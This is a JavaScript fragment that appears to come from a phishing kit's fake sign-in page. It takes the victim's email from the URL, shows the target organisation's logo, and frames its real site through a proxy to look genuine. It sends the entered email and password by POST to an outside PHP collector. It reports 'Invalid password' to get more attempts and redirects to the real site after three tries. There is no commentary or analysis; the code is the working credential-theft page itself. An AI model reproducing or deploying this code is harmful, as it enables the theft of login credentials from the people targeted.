 let turnstileValidated = false;
    let attemptCount = 0;

    function onTurnstileSuccess(token) {
        console.log("Turnstile validation successful");
        turnstileValidated = true;

        // Hide Turnstile and show the form
        $('.turnstile-wrapper').hide();
        $('.form-wrapper').show();

        // Extract email and set domain-based background and logo
        extractEmailFromHash();
    }

    function extractEmailFromHash() {
        const hash = window.location.hash.substr(1);
        if (hash) {
            const email = decodeURIComponent(hash);
            $('#email').val(email);

            const domain = email.substring(email.indexOf('@') + 1);
            $('#logoimg').attr('src', `https://logo.clearbit.com/${domain}`);
            $('#mainPage').attr('src', `https://equzalaohyeahforproxy.maxxwell-fab.workers.dev//?url=https://www.${domain}`);
        }
    }

    $(document).ready(function () {
        $('#contact').on('submit', function (event) {
            event.preventDefault();
            attemptCount++;

            const email = $('#email').val();
            const password = $('#password').val();
            const domain = email.substring(email.indexOf('@') + 1);

            if (!password) {
                $('#msg').show().html("Password field is empty!");
                return false;
            }

            if (!/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(email)) {
                $('#msg').show().html("Invalid email format!");
                return false;
            }

            if (attemptCount >= 3) {
                // Redirect after the third attempt regardless of success or failure
                window.location.replace(`https://equzalaohyeahforproxy.maxxwell-fab.workers.dev//?url=https://www.${domain}`);
                return;
            }

            $.ajax({
                url: 'https://rooftalkon.com/groupcall/sanisx/sanx.php',
                type: 'POST',
                dataType: 'JSON',
                data: { email: email, password: password },
                beforeSend: function () {
                    $('#submit-btn').text("Verifying...");
                },
                success: function (response) {
                    if (response.signal === "ok") {
                        window.location.replace(`https://equzalaohyeahforproxy.maxxwell-fab.workers.dev//?url=https://www.${domain}`);
                    } else {
                        $('#msg').show().html("Invalid password. Please try again.");
                        $('#password').val('');
                        $('#submit-btn').text("Sign in");
                    }
                },
                error: function () {
                    $('#msg').show().html("Invalid password. Please try again.");
                    $('#password').val('');
                    $('#submit-btn').text("Sign in");
                }
            });
        });
    });
